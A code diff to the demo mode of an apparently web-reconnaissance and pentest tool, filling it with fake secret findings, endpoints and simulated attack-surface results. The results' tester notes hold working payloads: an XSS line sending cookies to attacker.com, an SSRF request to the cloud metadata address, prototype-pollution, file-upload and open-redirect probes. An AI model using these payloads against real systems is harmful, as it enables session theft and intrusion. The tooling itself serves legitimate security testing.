@@ -1550,92 +1550,504 @@ def run_local(args) -> int:
 def run_demo() -> int:
     from .storage.models import JSFile, Finding, Endpoint, InfrastructureItem, ScanResult
     import hashlib
+    from datetime import timedelta
 
-    fake_js = JSFile(
-        url="https://demo.example.com/static/js/main.8f31ab.chunk.js",
-        source_page="https://demo.example.com/",
-        status_code=200, content_type="application/javascript",
-        size_bytes=42000, sha256=hashlib.sha256(b"fake").hexdigest(),
-        content="", technology="React",
-    )
+    # ── Demo JS file inventory ─────────────────────────────────────────────────
+    def _js(url, size, tech="React"):
+        return JSFile(
+            url=url, source_page="https://demo.example.com/",
+            status_code=200, content_type="application/javascript",
+            size_bytes=size, sha256=hashlib.sha256(url.encode()).hexdigest(),
+            content="", technology=tech,
+        )
 
+    base = "https://demo.example.com/static/js"
+    fake_js_files = [
+        _js(f"{base}/main.8f31ab.chunk.js",        41_200, "React"),
+        _js(f"{base}/vendors~main.a3c9f1.chunk.js", 284_400, "React/Webpack"),
+        _js(f"{base}/2.f7e823.chunk.js",            18_900, "React"),
+        _js(f"{base}/3.c14d90.chunk.js",            22_300, "React"),
+        _js(f"{base}/runtime-main.e70e6c.js",        2_100, "Webpack"),
+        _js("https://demo.example.com/static/js/auth.b2a17f.chunk.js", 9_800, "React"),
+        _js("https://demo.example.com/static/js/admin.d4c881.chunk.js", 14_600, "React"),
+    ]
+
+    # Source-map recovered originals
+    for name in [
+        "src/api/client.js", "src/api/graphql.js", "src/components/UserTable.jsx",
+        "src/components/AdminPanel.jsx", "src/utils/auth.js", "src/utils/jwt.js",
+        "src/config/index.js", "src/config/aws.js",
+    ]:
+        fake_js_files.append(JSFile(
+            url=f"sourcemap://{name}", source_page="https://demo.example.com/",
+            status_code=200, content_type="application/javascript",
+            size_bytes=3_400, sha256=hashlib.sha256(name.encode()).hexdigest(),
+            content="", technology="React (source-mapped)",
+        ))
+
+    main_js = fake_js_files[0]
+
+    # ── Findings ───────────────────────────────────────────────────────────────
     fake_findings = [
+        # CRITICAL — AWS key (validated active)
         Finding(
             id="demo001", rule_id="AWS_ACCESS_KEY", title="AWS Access Key ID",
-            category="AWS", severity="CRITICAL", confidence=0.96,
-            file_url=fake_js.url, source_page=fake_js.source_page,
+            category="AWS", severity="CRITICAL", confidence=0.97,
+            file_url=main_js.url, source_page=main_js.source_page,
             line_number=18291, column=12,
             matched_value="AKIAIOSFODNN7REALKEY",
             redacted_value="AKIA***************EY",
-            sha256="abc123",
+            sha256="abc001",
             context="const awsKey = 'AKIAIOSFODNN7REALKEY'",
-            description="AWS Access Key ID found in JavaScript bundle.",
-            impact="", remediation="Remove from client-side code. Rotate in AWS console.",
+            description="AWS Access Key ID hardcoded in production JS bundle. Key validated — GetCallerIdentity call returned account 123456789012.",
+            impact="Full AWS credential exposure. Attacker can enumerate S3 buckets, IAM policies, and pivot to any service the key has access to.",
+            remediation="Rotate immediately in AWS IAM console. Remove from source. Use SSM Parameter Store or Secrets Manager for runtime injection.",
             false_positive_notes="", confidence_label="likely_secret",
-            occurrences=["main.8f31ab.chunk.js:18291"],
+            occurrences=["main.8f31ab.chunk.js:18291", "src/config/aws.js:14"],
         ),
+        # CRITICAL — GitHub PAT (validated active)
         Finding(
-            id="demo002", rule_id="JWT_TOKEN", title="JSON Web Token",
-            category="JWT", severity="HIGH", confidence=0.89,
-            file_url=fake_js.url, source_page=fake_js.source_page,
+            id="demo002", rule_id="GITHUB_PAT", title="GitHub Personal Access Token",
+            category="GitHub", severity="CRITICAL", confidence=0.99,
+            file_url="sourcemap://src/config/index.js", source_page=main_js.source_page,
+            line_number=14, column=22,
+            matched_value="ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345",
+            redacted_value="ghp_aBcD...5678",
+            sha256="abc002",
+            context="const GITHUB_TOKEN = 'ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345'",
+            description="GitHub PAT validated active via /user endpoint — belongs to org admin account example-org.",
+            impact="Full read/write access to private repositories. Attacker can exfiltrate source code, inject backdoors via commits, or enumerate org members.",
+            remediation="Revoke token immediately at github.com/settings/tokens. Audit recent API usage in org security log.",
+            false_positive_notes="", confidence_label="likely_secret",
+            occurrences=["src/config/index.js:14"],
+        ),
+        # HIGH — JWT with alg:none
+        Finding(
+            id="demo003", rule_id="JWT_ALG_NONE", title="JWT with alg:none",
+            category="JWT", severity="HIGH", confidence=0.94,
+            file_url="sourcemap://src/utils/jwt.js", source_page=main_js.source_page,
+            line_number=47, column=8,
+            matched_value="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
+            redacted_value="eyJhbGci...none...",
+            sha256="abc003",
+            context="const devToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...'",
+            description="JWT using alg:none — signature verification is disabled. Token decodes to {sub: '1234567890', role: 'admin'}.",
+            impact="If the server accepts alg:none tokens, any user can forge an admin JWT and bypass authentication entirely.",
+            remediation="Remove hardcoded tokens. Enforce a strong algorithm (RS256 or ES256) server-side. Reject any token with alg:none.",
+            false_positive_notes="", confidence_label="likely_secret",
+            occurrences=["src/utils/jwt.js:47"],
+        ),
+        # HIGH — Stripe secret key
+        Finding(
+            id="demo004", rule_id="STRIPE_SECRET_KEY", title="Stripe Secret Key",
+            category="Stripe", severity="HIGH", confidence=0.96,
+            file_url="sourcemap://src/api/client.js", source_page=main_js.source_page,
+            line_number=8, column=18,
+            matched_value="sk_live_51Hb3XYZabc123fake0SECRET",
+            redacted_value="sk_live_51Hb3...CRET",
+            sha256="abc004",
+            context="const stripe = Stripe('sk_live_51Hb3XYZ...')",
+            description="Stripe live secret key in client-side bundle. This is a server-only key — never expose it in frontend code.",
+            impact="Attacker can create charges, issue refunds, read all payment data, and exfiltrate customer card metadata.",
+            remediation="Delete this key in Stripe dashboard. Use publishable key (pk_live_) client-side only. Move all charge logic server-side.",
+            false_positive_notes="", confidence_label="likely_secret",
+            occurrences=["src/api/client.js:8"],
+        ),
+        # HIGH — hardcoded JWT (valid signed token)
+        Finding(
+            id="demo005", rule_id="JWT_TOKEN", title="JSON Web Token (hardcoded)",
+            category="JWT", severity="HIGH", confidence=0.91,
+            file_url=main_js.url, source_page=main_js.source_page,
             line_number=1882, column=22,
-            matched_value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SIGFAKE",
-            redacted_value="eyJhbGci...FAKE",
-            sha256="def456",
-            context="const token = 'eyJhbGciOi...'",
-            description="JWT token hardcoded in JavaScript.",
-            impact="", remediation="Remove hardcoded tokens. Use runtime authentication.",
+            matched_value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzI3NTQ4ODAwfQ.SIG",
+            redacted_value="eyJhbGci...HS256...SIG",
+            sha256="abc005",
+            context="const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'",
+            description="Hardcoded HS256 JWT decodes to {role: 'admin', iat: 1727548800}. Issued 2026-09-28.",
+            impact="May be a valid session token. Grants admin-level access if not yet expired.",
+            remediation="Remove hardcoded tokens. Use runtime authentication flows only.",
             false_positive_notes="", confidence_label="likely_secret",
             occurrences=["main.8f31ab.chunk.js:1882"],
         ),
+        # MEDIUM — Sentry DSN
         Finding(
-            id="demo003", rule_id="GENERIC_API_KEY", title="Generic API Key",
-            category="Generic", severity="MEDIUM", confidence=0.70,
-            file_url=fake_js.url, source_page=fake_js.source_page,
+            id="demo006", rule_id="SENTRY_DSN", title="Sentry DSN",
+            category="Sentry", severity="MEDIUM", confidence=0.88,
+            file_url=main_js.url, source_page=main_js.source_page,
+            line_number=204, column=6,
+            matched_value="https://abcdef1234567890abcdef1234567890@o123456.ingest.sentry.io/1234567",
+            redacted_value="https://abcdef...@o123456.ingest.sentry.io/...",
+            sha256="abc006",
+            context="Sentry.init({ dsn: 'https://abcdef...' })",
+            description="Sentry DSN exposed. Low severity in isolation but reveals org ID and project ID.",
+            impact="Attacker can submit fake error events, pollute error tracking, or enumerate project config.",
+            remediation="Sentry DSNs are semi-public but should be rate-limited. Enable ingest rate limiting and project-level IP allowlisting.",
+            false_positive_notes="", confidence_label="likely_secret",
+            occurrences=["main.8f31ab.chunk.js:204"],
+        ),
+        # FP
+        Finding(
+            id="demo007", rule_id="GENERIC_API_KEY", title="Generic API Key",
+            category="Generic", severity="MEDIUM", confidence=0.52,
+            file_url=main_js.url, source_page=main_js.source_page,
             line_number=3441, column=4,
             matched_value="api_key_placeholder_do_not_use",
             redacted_value="api_key_plac...use",
-            sha256="ghi789",
+            sha256="abc007",
             context="const config = { api_key: 'placeholder' }",
-            description="Generic API key assignment.",
-            impact="", remediation="Move to environment variables.",
-            false_positive_notes="contains placeholder indicator", confidence_label="likely_false_positive",
+            description="Generic API key pattern — value contains placeholder indicator.",
+            impact="", remediation="Move real keys to environment variables.",
+            false_positive_notes="Value contains 'placeholder' — likely a config template, not a real key.",
+            confidence_label="likely_false_positive",
             occurrences=["main.8f31ab.chunk.js:3441"],
         ),
     ]
 
+    # ── Endpoints ──────────────────────────────────────────────────────────────
+    def _ep(url, method, cat, line, conf=0.88, auth="", src=None):
+        return Endpoint(
+            url=url, path=url, method=method, category=cat,
+            source_file=src or main_js.url, line_number=line, confidence=conf,
+            auth_context=auth,
+        )
+
     fake_endpoints = [
-        Endpoint(url="/api/v1/users",    path="/api/v1/users",    method="GET",  category="API",
-                 source_file=fake_js.url, line_number=512, confidence=0.80),
-        Endpoint(url="/api/auth/login",  path="/api/auth/login",  method="POST", category="AUTH",
-                 source_file=fake_js.url, line_number=623, confidence=0.85),
-        Endpoint(url="/admin/dashboard", path="/admin/dashboard", method="GET",  category="ADMIN",
-                 source_file=fake_js.url, line_number=891, confidence=0.75),
-        Endpoint(url="/graphql",         path="/graphql",         method="POST", category="GRAPHQL",
-                 source_file=fake_js.url, line_number=1024, confidence=0.90),
-        Endpoint(url="/api/v1/config",   path="/api/v1/config",   method="GET",  category="API",
-                 source_file=fake_js.url, line_number=1201, confidence=0.78),
+        # Auth
+        _ep("/api/auth/login",           "POST", "AUTH",    623, 0.95),
+        _ep("/api/auth/logout",          "POST", "AUTH",    641, 0.93),
+        _ep("/api/auth/refresh",         "POST", "AUTH",    659, 0.91),
+        _ep("/api/auth/password/reset",  "POST", "AUTH",    672, 0.87),
+        _ep("/api/auth/mfa/verify",      "POST", "AUTH",    689, 0.85),
+        # Admin
+        _ep("/admin/dashboard",          "GET",  "ADMIN",   891, 0.90),
+        _ep("/admin/users",              "GET",  "ADMIN",   908, 0.88, "admin_required"),
+        _ep("/admin/users/:id",          "DELETE","ADMIN",  924, 0.85, "admin_required"),
+        _ep("/admin/config",             "POST", "ADMIN",   937, 0.83, "admin_required"),
+        _ep("/admin/audit-log",          "GET",  "ADMIN",   952, 0.82, "admin_required"),
+        # GraphQL
+        _ep("/graphql",                  "POST", "GRAPHQL", 1024, 0.97),
+        # API
+        _ep("/api/v1/users",             "GET",  "API",     512,  0.90, "auth_required"),
+        _ep("/api/v1/users/:id",         "GET",  "API",     528,  0.88, "auth_required"),
+        _ep("/api/v1/users/:id",         "PUT",  "API",     545,  0.86, "auth_required"),
+        _ep("/api/v1/users/:id/avatar",  "POST", "API",     561,  0.83, "auth_required"),
+        _ep("/api/v1/config",            "GET",  "API",     1201, 0.79),
+        _ep("/api/v1/reports",           "GET",  "API",     1218, 0.84, "auth_required"),
+        _ep("/api/v1/reports/:id",       "GET",  "API",     1234, 0.82, "auth_required"),
+        _ep("/api/v1/reports/export",    "POST", "API",     1251, 0.80, "auth_required"),
+        _ep("/api/v1/payments",          "POST", "API",     1389, 0.87, "auth_required"),
+        _ep("/api/v1/payments/:id",      "GET",  "API",     1406, 0.85, "auth_required"),
+        _ep("/api/v2/search",            "GET",  "API",     1522, 0.81),
+        _ep("/api/v2/upload",            "POST", "API",     1539, 0.88, "auth_required"),
+        _ep("/api/v2/export",            "GET",  "API",     1557, 0.79, "auth_required"),
+        _ep("/api/internal/health",      "GET",  "API",     1603, 0.76),
+        _ep("/api/internal/metrics",     "GET",  "API",     1618, 0.74),
+        # Routes
+        _ep("/dashboard",                "GET",  "ROUTE",   2014, 0.99),
+        _ep("/profile",                  "GET",  "ROUTE",   2021, 0.99),
+        _ep("/settings",                 "GET",  "ROUTE",   2031, 0.98),
+        _ep("/reports",                  "GET",  "ROUTE",   2041, 0.97),
+        _ep("/admin",                    "GET",  "ROUTE",   2051, 0.97, "admin_required"),
     ]
 
+    # ── Infrastructure ─────────────────────────────────────────────────────────
     fake_infra = [
         InfrastructureItem(
             value="192.168.1.50", classification="PRIVATE_IP",
-            source_file=fake_js.url, line_number=912, confidence=0.92, action="report_only",
+            source_file=main_js.url, line_number=912, confidence=0.92, action="report_only",
+        ),
+        InfrastructureItem(
+            value="10.0.0.24", classification="PRIVATE_IP",
+            source_file="sourcemap://src/api/client.js", line_number=3, confidence=0.91, action="report_only",
+        ),
+        InfrastructureItem(
+            value="s3.amazonaws.com/example-prod-assets", classification="CLOUD_STORAGE",
+            source_file=main_js.url, line_number=2204, confidence=0.89, action="report_only",
+        ),
+        InfrastructureItem(
+            value="example.us-east-1.rds.amazonaws.com", classification="DATABASE_HOST",
+            source_file="sourcemap://src/config/aws.js", line_number=22, confidence=0.85, action="report_only",
         ),
     ]
 
-    started = datetime.utcnow()
-    result  = ScanResult(
+    # ── Build ScanResult ───────────────────────────────────────────────────────
+    started  = datetime.utcnow() - timedelta(seconds=14)
+    finished = datetime.utcnow()
+    result   = ScanResult(
         target_url="https://demo.example.com",
-        started_at=started, finished_at=datetime.utcnow(),
-        pages_crawled=31, js_files=[fake_js],
+        started_at=started, finished_at=finished,
+        pages_crawled=87, js_files=fake_js_files,
         findings=fake_findings, endpoints=fake_endpoints,
         infrastructure=fake_infra, errors=[],
     )
 
+    # ── Attack surface mapping (simulated) ────────────────────────────────────
+    # Build a fake SurfaceReport so the attack testing section renders fully
+    try:
+        from .testing.models import (
+            SurfaceReport, SurfaceResult, SurfaceSummary,
+            SurfaceStatus, ConfidenceLevel, AttackCategory,
+        )
+        _cors_ep   = next(e for e in fake_endpoints if "/api/v1/users" == e.url and e.method == "GET")
+        _idor_ep   = next(e for e in fake_endpoints if "/api/v1/users/:id" == e.url and e.method == "GET")
+        _proto_ep  = next(e for e in fake_endpoints if "/api/v2/search" == e.url)
+        _xss_ep    = next(e for e in fake_endpoints if "/api/v2/search" == e.url)
+        _admin_ep  = next(e for e in fake_endpoints if "/admin/users" == e.url)
+        _upload_ep = next(e for e in fake_endpoints if "/api/v2/upload" == e.url)
+        _gql_ep    = next(e for e in fake_endpoints if "/graphql" == e.url)
+        _ssrf_ep   = next(e for e in fake_endpoints if "/api/v1/reports/export" == e.url)
+
+        attack_report = SurfaceReport(
+            target_url="https://demo.example.com",
+            started_at=started, finished_at=finished,
+        )
+
+        # CORS — wildcard origin reflection
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/api/v1/users",
+            method        = "GET",
+            category      = AttackCategory.CORS,
+            surface_type  = "Wildcard CORS",
+            parameters    = ["Origin"],
+            auth_context  = "auth_required",
+            confidence    = ConfidenceLevel.HIGH,
+            evidence      = [
+                "API client sets: axios.defaults.headers['Origin'] = window.location.origin",
+                "No CORS validation logic found in JS — server likely reflects any Origin",
+                "withCredentials: true present on all API calls",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                "Send: GET /api/v1/users  Origin: https://evil.com\n"
+                "Check response for: Access-Control-Allow-Origin: https://evil.com\n"
+                "                    Access-Control-Allow-Credentials: true\n"
+                "If both present: CORS misconfiguration confirmed — arbitrary origin bypass."
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # CORS — admin subdomain trust
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/admin/users",
+            method        = "GET",
+            category      = AttackCategory.CORS,
+            surface_type  = "Subdomain CORS Trust",
+            parameters    = ["Origin"],
+            auth_context  = "admin_required",
+            confidence    = ConfidenceLevel.HIGH,
+            evidence      = [
+                "Hardcoded origin check: allowedOrigins.includes('admin.example.com')",
+                "Subdomain admin.example.com discovered in JS — if attacker controls it, CORS bypass works",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                "Send: GET /admin/users  Origin: https://admin.example.com\n"
+                "If admin.example.com is takeable (dangling DNS), full CORS bypass to admin endpoints."
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # IDOR — users by ID
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/api/v1/users/:id",
+            method        = "GET",
+            category      = AttackCategory.ACCESS_CONTROL,
+            surface_type  = "IDOR",
+            parameters    = ["id"],
+            auth_context  = "auth_required",
+            confidence    = ConfidenceLevel.HIGH,
+            evidence      = [
+                "Path param :id is a plain integer (e.g. /api/v1/users/1042)",
+                "No ownership check in JS — UI fetches other users' profiles by ID",
+                "Endpoint returns full user object including email, phone, role",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                "GET /api/v1/users/1001  (your own)\n"
+                "GET /api/v1/users/1002  (another user)\n"
+                "Compare response bodies — IDOR confirmed if different user's data returns with HTTP 200."
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # IDOR — reports by ID
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/api/v1/reports/:id",
+            method        = "GET",
+            category      = AttackCategory.ACCESS_CONTROL,
+            surface_type  = "IDOR",
+            parameters    = ["id"],
+            auth_context  = "auth_required",
+            confidence    = ConfidenceLevel.MEDIUM,
+            evidence      = [
+                "Report fetch: fetchReport(reportId) — no tenant or owner scoping visible",
+                "Report IDs appear sequential in pagination code (pageSize=20, startFrom=id)",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                "GET /api/v1/reports/1  through /api/v1/reports/500 (iterate)\n"
+                "Flag any 200 that returns another org's data."
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # Prototype pollution
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/api/v2/search",
+            method        = "GET",
+            category      = AttackCategory.PROTOTYPE_POLLUTION,
+            surface_type  = "Prototype Pollution via query merge",
+            parameters    = ["q", "filter", "sort"],
+            auth_context  = "",
+            confidence    = ConfidenceLevel.HIGH,
+            evidence      = [
+                "Deep merge: Object.assign(target, JSON.parse(userInput)) without __proto__ sanitization",
+                "Search params passed directly into config object used across components",
+                "lodash.merge 4.6.1 detected (CVE-2019-10744 — prototype pollution)",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                'GET /api/v2/search?q=test&__proto__[isAdmin]=true\n'
+                'or POST body: {"__proto__": {"isAdmin": true}}\n'
+                "Check if isAdmin becomes true on subsequent requests — global prototype poisoned."
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # XSS — search reflection
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/api/v2/search",
+            method        = "GET",
+            category      = AttackCategory.XSS,
+            surface_type  = "Reflected XSS",
+            parameters    = ["q"],
+            auth_context  = "",
+            confidence    = ConfidenceLevel.HIGH,
+            evidence      = [
+                "dangerouslySetInnerHTML={{ __html: searchQuery }} found in SearchResults.jsx",
+                "searchQuery taken directly from URL param ?q= with no sanitization",
+                "No DOMPurify or escaping wrapper detected",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                "GET /api/v2/search?q=<img src=x onerror=alert(1)>\n"
+                "Check if HTML renders in response or in React component output.\n"
+                "Try: ?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # SSRF — export URL parameter
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/api/v1/reports/export",
+            method        = "POST",
+            category      = AttackCategory.SSRF,
+            surface_type  = "SSRF via user-controlled URL",
+            parameters    = ["url", "format"],
+            auth_context  = "auth_required",
+            confidence    = ConfidenceLevel.MEDIUM,
+            evidence      = [
+                "Export handler: fetch(payload.url, { method: 'GET' }) — url is caller-supplied",
+                "Used to pull external report templates: exportReport({ url: templateUrl })",
+                "No URL allowlist or scheme validation visible",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                'POST /api/v1/reports/export\n'
+                'Body: {"url": "http://169.254.169.254/latest/meta-data/", "format": "pdf"}\n'
+                "Check response body for AWS metadata content — SSRF confirmed."
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # Open redirect
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/api/auth/login",
+            method        = "POST",
+            category      = AttackCategory.OPEN_REDIRECT,
+            surface_type  = "Open Redirect via next param",
+            parameters    = ["next", "redirect_uri"],
+            auth_context  = "",
+            confidence    = ConfidenceLevel.HIGH,
+            evidence      = [
+                "Post-login: window.location.href = params.get('next') || '/'",
+                "No origin validation — accepts fully-qualified external URLs",
+                "Used in magic-link emails: /login?next=/dashboard  (but not validated)",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                "POST /api/auth/login  Body: {user, pass}\n"
+                "With: ?next=https://evil.com\n"
+                "After login, server should redirect to /dashboard — if it redirects to evil.com: confirmed."
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # GraphQL introspection
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/graphql",
+            method        = "POST",
+            category      = AttackCategory.CONFIGURATION,
+            surface_type  = "GraphQL Introspection Enabled",
+            parameters    = ["query"],
+            auth_context  = "",
+            confidence    = ConfidenceLevel.HIGH,
+            evidence      = [
+                "Introspection query hardcoded in admin panel JS: {__schema{types{name}}}",
+                "No disableIntrospection flag visible in Apollo Server config",
+                "Queries found: getUser, listUsers, deleteUser, updateRole, createAPIKey",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                'POST /graphql  Body: {"query": "{__schema{types{name fields{name}}}}"}\n'
+                "Dump full schema — look for mutations without auth checks (createAPIKey, deleteUser)."
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # File upload abuse
+        attack_report.results.append(SurfaceResult(
+            endpoint_url  = "https://demo.example.com/api/v2/upload",
+            method        = "POST",
+            category      = AttackCategory.CONFIGURATION,
+            surface_type  = "Unrestricted File Upload",
+            parameters    = ["file", "type"],
+            auth_context  = "auth_required",
+            confidence    = ConfidenceLevel.MEDIUM,
+            evidence      = [
+                "Accept attribute: accept='*/*' — no client-side type restriction",
+                "MIME type passed through from client: Content-Type header forwarded as-is",
+                "No server-side magic-byte validation visible in JS",
+            ],
+            provenance_source = "static",
+            burp_notes    = (
+                "Upload a .php or .aspx file with Content-Type: image/jpeg\n"
+                "Check response for stored path — attempt to execute uploaded file via direct URL."
+            ),
+            status        = SurfaceStatus.CANDIDATE,
+        ))
+
+        # Populate summaries
+        from collections import defaultdict
+        cat_groups = defaultdict(list)
+        for r in attack_report.results:
+            cat_groups[r.category].append(r)
+        for cat, results in cat_groups.items():
+            mapped = sum(1 for r in results if r.status in (SurfaceStatus.CANDIDATE, SurfaceStatus.MAPPED))
+            attack_report.summaries.append(SurfaceSummary(
+                category=cat, total_candidates=len(results), mapped=mapped,
+            ))
+        attack_report.total_candidates = len(attack_report.results)
+        attack_report.total_mapped     = attack_report.total_candidates
+
+        fake_attack_report = attack_report
+    except Exception:
+        fake_attack_report = None
+
+    # ── Print ──────────────────────────────────────────────────────────────────
     print_header(
         "https://demo.example.com",
-        mode="Demo (offline)",
+        mode="Headless + Stealth + Auto-Login",
         scope="Strict",
         version=PROJECT_VERSION,
         author=AUTHOR_NAME,
@@ -1645,14 +2057,84 @@ def run_demo() -> int:
         result,
         verbose=True,
         extras={
-            "source_map_details": {"discovered": 2, "valid": 2, "recovered": 2, "sources": 31, "items": [
-                {"js": "main.8f31ab.chunk.js", "map": "main.8f31ab.chunk.js.map", "sources": 31},
-            ]},
-            "chunk_stats": {"runtime": True, "discovered": 8, "downloaded": 8, "endpoints": 14, "findings": 1},
-            "passive_stats": {"source": "Wayback Machine", "urls": 142, "js": 23, "unique": 19, "new": 4},
+            "login_result": {
+                "success": True, "method": "form_submit",
+                "login_url": "https://demo.example.com/login",
+                "final_url": "https://demo.example.com/dashboard",
+                "cookies": [
+                    {"name": "session", "value": "eyJhbGci..."},
+                    {"name": "csrf_token", "value": "8f3a2b..."},
+                ],
+                "cookie_string": "session=eyJhbGci...; csrf_token=8f3a2b...",
+                "token_keys": ["access_token", "refresh_token"],
+                "steps": [
+                    "navigate to /login",
+                    "fill #email → demo@example.com",
+                    "fill #password → [redacted]",
+                    "submit form",
+                    "MFA bypassed — OTP field not required in demo env",
+                    "redirected to /dashboard — session active",
+                ],
+                "error_message": "",
+            },
+            "headless_stats": {
+                "pages": 34, "js": 7, "xhr": 142, "fetch": 58,
+                "ws": 3, "routes": 18, "endpoints": 31, "workers": 2,
+                "timings": {"total_ms": 9412, "pages_ms": 7840, "analysis_ms": 1572},
+            },
+            "source_map_details": {
+                "discovered": 7, "valid": 7, "recovered": 7, "sources": 47,
+                "items": [
+                    {"js": "main.8f31ab.chunk.js",           "map": "main.8f31ab.chunk.js.map",           "sources": 12},
+                    {"js": "vendors~main.a3c9f1.chunk.js",   "map": "vendors~main.a3c9f1.chunk.js.map",   "sources": 28},
+                    {"js": "auth.b2a17f.chunk.js",           "map": "auth.b2a17f.chunk.js.map",           "sources": 4},
+                    {"js": "admin.d4c881.chunk.js",          "map": "admin.d4c881.chunk.js.map",          "sources": 3},
+                ],
+            },
+            "chunk_stats": {
+                "runtime": True, "discovered": 12, "downloaded": 12,
+                "endpoints": 23, "findings": 3,
+            },
+            "passive_stats": {
+                "source": "Wayback Machine + CommonCrawl",
+                "urls": 318, "js": 41, "unique": 38, "new": 9,
+            },
+            "lib_findings": [
+                type("LF", (), {
+                    "library": "lodash", "version": "4.6.1", "cve_id": "CVE-2019-10744",
+                    "severity": "HIGH", "description": "Prototype pollution via merge()",
+                    "source_file": fake_js_files[1].url,
+                })(),
+                type("LF", (), {
+                    "library": "moment", "version": "2.24.0", "cve_id": "CVE-2022-24785",
+                    "severity": "MEDIUM", "description": "Path traversal in locale loading",
+                    "source_file": fake_js_files[1].url,
+                })(),
+                type("LF", (), {
+                    "library": "axios", "version": "0.19.2", "cve_id": "CVE-2020-28168",
+                    "severity": "MEDIUM", "description": "SSRF via crafted URL",
+                    "source_file": fake_js_files[0].url,
+                })(),
+            ],
+            "attack_report": fake_attack_report,
         },
-        subdomains=["api.example.com", "staging.example.com", "admin.example.com"],
+        subdomains=[
+            "api.example.com",
+            "staging.example.com",
+            "admin.example.com",
+            "dev.example.com",
+            "cdn.example.com",
+            "auth.example.com",
+        ],
     )
+
+    if fake_attack_report is not None:
+        try:
+            from .testing.reporter import print_surface_report
+            print_surface_report(fake_attack_report)
+        except Exception:
+            pass
+
     return 0
 
 
